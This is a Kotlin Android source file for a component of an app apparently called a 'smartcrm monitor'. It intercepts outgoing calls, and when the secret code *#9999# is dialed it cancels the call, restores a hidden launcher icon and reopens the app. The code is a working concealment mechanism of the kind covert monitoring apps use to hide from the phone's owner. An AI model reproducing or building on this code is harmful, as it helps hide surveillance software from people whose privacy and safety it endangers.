package com.smartcrm.monitor

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper

/**
 * Listens for outgoing calls.
 * If dialed number is SECRET_CODE (*#9999#), intercepts and:
 *   1. Cancels the call
 *   2. Re-enables the launcher icon temporarily
 *   3. Opens MainActivity again (for re-init or admin check)
 */
class DialerReceiver : BroadcastReceiver() {

    companion object {
        const val SECRET_CODE = "*#9999#"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.intent.action.NEW_OUTGOING_CALL") return

        val number = resultData ?: intent.getStringExtra("android.intent.extra.PHONE_NUMBER") ?: return

        // Normalize: remove spaces, dashes
        val cleaned = number.replace("\\s".toRegex(), "").replace("-", "")

        if (cleaned == SECRET_CODE || cleaned == "9999") {
            // Cancel the call
            resultData = null

            // Re-enable launcher icon
            try {
                val compName = ComponentName(context, MainActivity::class.java)
                context.packageManager.setComponentEnabledSetting(
                    compName,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (e: Exception) {}

            // Reset hidden flag so icon can be re-hidden on next open
            val prefs = context.getSharedPreferences(Config.PREFS_NAME, Context.MODE_PRIVATE)
            prefs.edit().putBoolean("icon_hidden", false).apply()

            // Small delay then start MainActivity
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    val mainIntent = Intent(context, MainActivity::class.java)
                    mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    context.startActivity(mainIntent)
                } catch (e: Exception) {}
            }, 500)
        }
    }
}
